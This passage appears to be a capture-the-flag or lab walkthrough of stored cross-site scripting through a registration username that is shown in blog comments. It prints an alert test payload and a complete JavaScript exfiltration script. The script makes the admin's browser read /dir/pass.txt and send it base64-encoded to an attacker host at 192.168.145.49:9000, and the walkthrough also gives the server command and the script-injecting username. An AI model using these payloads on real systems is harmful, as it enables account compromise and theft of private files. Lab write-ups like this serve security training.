Creating an Account
/register.php allows new user registration. The username field is later displayed on /blog.php when leaving comments.

XSS in Username
Register a user with a simple XSS payload as username:

html
<script>alert(1)</script>
Log in and post any comment. The alert triggers – the username is not sanitized and is rendered in the comments section.

Since the admin (admin user) monitors comments, any XSS payload will be executed in the admin's browser.

XSS Payload to Exfiltrate /dir/pass.txt
We need a JavaScript payload that makes the admin's browser fetch http://127.0.0.1/dir/pass.txt and send the content back to our attacker machine.

Payload (exfil.js):

javascript
// XSS Data Exfiltration
var uri = "/dir/pass.txt";
var xhr = new XMLHttpRequest();
xhr.open("GET", uri, true);
xhr.send(null);
xhr.onreadystatechange = function() {
  if (xhr.readyState == XMLHttpRequest.DONE) {
    var data = btoa(xhr.responseText);
    var img = new Image();
    img.src = "http://192.168.145.49:9000/exfil/LAST/" + data + ".jpg";
  }
}
Serve the payload:

bash
python3 -m http.server 9000
Register a new user with the XSS payload as username:

html
<script src="http://192.168.145.49:9000/exfil.js"></script>
Then log in and post a comment. The admin will visit the blog, load our script, and exfiltrate the file.

